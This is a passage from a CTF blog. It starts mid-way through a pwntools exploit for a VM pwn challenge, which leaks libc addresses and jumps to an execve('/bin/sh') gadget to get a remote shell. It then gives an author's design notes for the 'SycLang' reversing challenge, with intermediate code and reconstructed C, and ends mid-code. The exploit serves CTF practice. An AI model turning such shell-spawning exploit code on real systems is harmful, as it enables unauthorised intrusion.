class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xB58C)\n&quot;</span>) <span class="comment">#0xD792</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op</span>(<span class="params">op,rsi,rdx,rcx,r8</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p8(op)+p8(rsi)+p8(rdx)+p8(rcx)+p32(r8)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span>(<span class="params">offset,data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,offset,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intemp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">0x12</span>,<span class="number">4</span>,<span class="number">3</span>,offset,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outtemp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">0x13</span>,<span class="number">4</span>,<span class="number">3</span>,offset,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">offset,data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,offset,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code =  intemp(<span class="number">0x10</span>) </span><br><span class="line">code += outtemp(<span class="number">0</span>)</span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0x323020</span>+<span class="number">8</span>-<span class="number">0x80000</span>)</span><br><span class="line">code += add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code += intemp(<span class="number">1</span>)</span><br><span class="line">code += outtemp(<span class="number">0x10</span>)</span><br><span class="line">code += outtemp(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0xe6aee</span>-<span class="number">0x9ec90</span>)</span><br><span class="line">code += add(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0x323f58</span>+<span class="number">0x10</span>-<span class="number">0x80000</span>)</span><br><span class="line">code += add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code += intemp(<span class="number">1</span>)</span><br><span class="line">code += outtemp(<span class="number">0x10</span>)</span><br><span class="line">code += intemp(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">data =  <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;input code for vm: &quot;</span>,code)</span><br><span class="line">sa(<span class="string">&quot;input data for vm: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0xe6aee execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af1 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af4 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">SycLang出题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-21 10:13:16 / Modified: 10:16:54" itemprop="dateCreated datePublished" datetime="2023-06-21T10:13:16+08:00">2023-06-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-Challenge/" itemprop="url" rel="index"><span itemprop="name">CTF Challenge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>SycLang 出题思路</strong></p>
<p>本题目提供了中间代码和编译器前端，要求将中间代码逆向回C，自行编译后解出 flag（当然也可以直接通过中间代码分析 flag）</p>
<p>首先，本程序有3个陷阱：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var12&lt;+32&gt; := var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt;</span><br><span class="line">  temp84 := #1</span><br><span class="line">  temp85 := var15&lt;+56&gt; + temp84</span><br><span class="line">  var18&lt;+80&gt; := temp85</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var13&lt;+40&gt; := var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt;</span><br><span class="line">  temp86 := #0</span><br><span class="line">  var13&lt;+40&gt; := temp86</span><br><span class="line">  temp87 := var12&lt;+32&gt; ^ var13&lt;+40&gt;</span><br><span class="line">  var14&lt;+48&gt; := temp87</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt; := var14&lt;+48&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>var13&lt;+40&gt;</code> 在异或前会赋值“0”，因此对 <code>e1.key(var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt;)</code> 的异或加密失效</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">LABEL label59 :</span><br><span class="line">  temp89 := #0</span><br><span class="line">  var24(@exp.L[0])&lt;+200&gt;&lt;+1256&gt; := temp89</span><br><span class="line">  temp91 := #12</span><br><span class="line">  var24(@exp.R[0])&lt;+264&gt;&lt;+1256&gt; := temp91</span><br><span class="line">  temp93 := #0</span><br><span class="line">  </span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">  var24(@exp.key[23])&lt;+192&gt;&lt;+1256&gt; := temp195</span><br><span class="line">  temp196 := #23</span><br><span class="line">  var15&lt;+56&gt; := temp196</span><br><span class="line">LABEL label118 :</span><br><span class="line">  temp198 := #0</span><br><span class="line">  IF var15&lt;+56&gt; &gt; temp198 GOTO label117</span><br><span class="line">  GOTO label116</span><br><span class="line">LABEL label117 :</span><br><span class="line">  var18&lt;+80&gt; := var15&lt;+56&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp199 := #1</span><br><span class="line">  temp200 := var15&lt;+56&gt; - temp199</span><br><span class="line">  var16&lt;+64&gt; := temp200</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp201 := var19&lt;+88&gt; - var17&lt;+72&gt;</span><br><span class="line">  var21&lt;+104&gt; := temp201</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var21&lt;+104&gt;</span><br><span class="line">  temp197 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; - temp197</span><br><span class="line">  GOTO label118</span><br><span class="line">LABEL label116 :</span><br><span class="line">  temp202 := #0</span><br><span class="line">  var15&lt;+56&gt; := temp202</span><br><span class="line">LABEL label126 :</span><br><span class="line">  temp204 := #8</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp204 GOTO label125</span><br><span class="line">  GOTO label124</span><br><span class="line">LABEL label125 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var16&lt;+64&gt; := var24(@exp.L[0])&lt;+200&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var18&lt;+80&gt; := var24(@exp.R[0])&lt;+264&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var24(@exp.X[0])&lt;+328&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; + var20&lt;+96&gt;</span><br><span class="line">  var19&lt;+88&gt; := var19&lt;+88&gt; - var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var19&lt;+88&gt;</span><br><span class="line">  temp203 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp203</span><br><span class="line">  GOTO label126</span><br><span class="line">LABEL label124 :</span><br><span class="line">  temp207 := #1</span><br><span class="line">  var15&lt;+56&gt; := temp207</span><br><span class="line">LABEL label137 :</span><br><span class="line">  temp209 := #24</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp209 GOTO label136</span><br><span class="line">  GOTO label135</span><br><span class="line">LABEL label136 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp210 := #1</span><br><span class="line">  temp211 := var15&lt;+56&gt; - temp210</span><br><span class="line">  var16&lt;+64&gt; := temp211</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; + var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">  temp208 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp208</span><br><span class="line">  GOTO label137</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LABEL label168 :</span><br><span class="line">  temp263 := #24</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp263 GOTO label167</span><br><span class="line">  GOTO label166</span><br><span class="line">LABEL label167 :</span><br><span class="line">  var16&lt;+64&gt; := var15&lt;+56&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var23(@exp.key[0])&lt;+8&gt;&lt;+872&gt;&lt;+tempa&gt;</span><br><span class="line">  var18&lt;+80&gt; := var15&lt;+56&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp264 := var17&lt;+72&gt; ^ var19&lt;+88&gt;</span><br><span class="line">  var21&lt;+104&gt; := temp264</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var23(@exp.key[0])&lt;+8&gt;&lt;+872&gt;&lt;+tempa&gt; := var21&lt;+104&gt;</span><br><span class="line">  temp262 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp262</span><br><span class="line">  GOTO label168</span><br></pre></td></tr></table></figure>
<ul>
<li>对 <code>e3.key(var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;)</code> 的前缀和差分加密会导致 <code>e3.key</code> 全为 “0”，进而对 <code>e2.key(var23(@exp.key[0])&lt;+8&gt;&lt;+872&gt;&lt;+tempa&gt;)</code> 的异或加密失效</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">LABEL label271 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var16&lt;+64&gt; := var25(@exp.L[0])&lt;+200&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var18&lt;+80&gt; := var25(@exp.R[0])&lt;+264&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var25(@exp.X[0])&lt;+328&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; - var20&lt;+96&gt;</span><br><span class="line">  var19&lt;+88&gt; := var19&lt;+88&gt; + var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt; := var19&lt;+88&gt;</span><br><span class="line">  temp369 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp369</span><br><span class="line">  GOTO label272</span><br><span class="line">LABEL label270 :</span><br><span class="line">  temp373 := #1</span><br><span class="line">  var15&lt;+56&gt; := temp373</span><br><span class="line">LABEL label283 :</span><br><span class="line">  temp375 := #24</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp375 GOTO label282</span><br><span class="line">  GOTO label281</span><br><span class="line">LABEL label282 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">  temp376 := #1</span><br><span class="line">  temp377 := var15&lt;+56&gt; - temp376</span><br><span class="line">  var16&lt;+64&gt; := temp377</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; + var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">  temp374 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; + temp374</span><br><span class="line">  GOTO label283</span><br></pre></td></tr></table></figure>
<ul>
<li>对 <code>e4.key(var25(@exp.key[0])&lt;+8&gt;&lt;+1640&gt;&lt;+tempa&gt;)</code> 的前缀和差分加密最后会得到一个 fake flag</li>
</ul>
<p>程序有效部分的核心逻辑如下：</p>
<ul>
<li>程序读取 flag 存入 <code>e1.key</code> 进行第一次前缀和差分，区间修改的操作数在 <code>e1.L，e1.R，e1.X</code> 中（已知）</li>
<li>将第一轮计算的结果间隔取8个存入 <code>e2.X</code>，当做第二次前缀和差分的操作数</li>
<li>第二次使用 <code>e1.L，e1.R，e2.X</code> 对 <code>e2.key</code>（已知）进行前缀和差分</li>
<li>最后对比 <code>e1.key</code> 和 <code>e2.key</code> 完全相同则 success</li>
</ul>
<p>前缀和差分相当于对 <code>[L，R)</code> 的所有数字 +X：</p>
<ul>
<li>由于第一次前缀和的操作数已知，得到结果 <code>e1.key[i]</code> 为 <code>INPUT[i] + C[i]</code></li>
<li>由于第二次前缀和差分需要用到第一次前缀和差分的结果，此时的 <code>X[i]</code> 已经变成 <code>INPUT[i*3] + C[i*3]</code>，结果 <code>e2.key[i]</code> 表达为 <code>INPUT[j1] + INPUT[j2] ...... INPUT[jn] + C[j]</code></li>
<li>由于 <code>e2.key</code> 的初始值已知，常数 <code>C[j]</code> 可通过 <code>e1.L，e1.R，e1.X</code> 算出，加密后的 <code>e1.key[i]</code> 可以由含有 <code>INPUT[j]</code> 的式子来表示，加密后的 <code>e2.key[i]</code> 也可以用含有 <code>INPUT[j]</code> 的式子来表示，两者结合可以得到 24 组一次方程</li>
</ul>
<p>通过中间代码提取出来的C代码样例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">    key1 = <span class="number">0</span>;</span><br><span class="line">    x = i;</span><br><span class="line">    key1 = flag[x];</span><br><span class="line">    y = <span class="number">23</span> - i;</span><br><span class="line">    e1.key[y] = key1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">23</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">    y = i;</span><br><span class="line">    ky = e1.key[y];</span><br><span class="line">    x = i - <span class="number">1</span>;</span><br><span class="line">    kx = e1.key[x]; </span><br><span class="line">    kz = ky - kx;</span><br><span class="line">    e1.key[i] = kz; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e1.L[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">e1.R[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">e1.X[<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">e1.L[<span class="number">1</span>] = <span class="number">15</span>;</span><br><span class="line">e1.R[<span class="number">1</span>] = <span class="number">23</span>;</span><br><span class="line">e1.X[<span class="number">1</span>] = <span class="number">0</span><span class="number">-13</span>;</span><br><span class="line">e1.L[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">e1.R[<span class="number">2</span>] = <span class="number">11</span>;</span><br><span class="line">e1.X[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">e1.L[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">e1.R[<span class="number">3</span>] = <span class="number">20</span>;</span><br><span class="line">e1.X[<span class="number">3</span>] = <span class="number">0</span><span class="number">-19</span>;</span><br><span class="line">e1.L[<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">e1.R[<span class="number">4</span>] = <span class="number">13</span>;</span><br><span class="line">e1.X[<span class="number">4</span>] = <span class="number">23</span>;</span><br><span class="line">e1.L[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">e1.R[<span class="number">5</span>] = <span class="number">21</span>;</span><br><span class="line">e1.X[<span class="number">5</span>] = <span class="number">0</span><span class="number">-29</span>;</span><br><span class="line">e1.L[<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">e1.R[<span class="number">6</span>] = <span class="number">19</span>;</span><br><span class="line">e1.X[<span class="number">6</span>] = <span class="number">31</span>;</span><br><span class="line">e1.L[<span class="number">7</span>] = <span class="number">4</span>;</span><br><span class="line">e1.R[<span class="number">7</span>] = <span class="number">17</span>;</span><br><span class="line">e1.X[<span class="number">7</span>] = <span class="number">0</span><span class="number">-37</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span 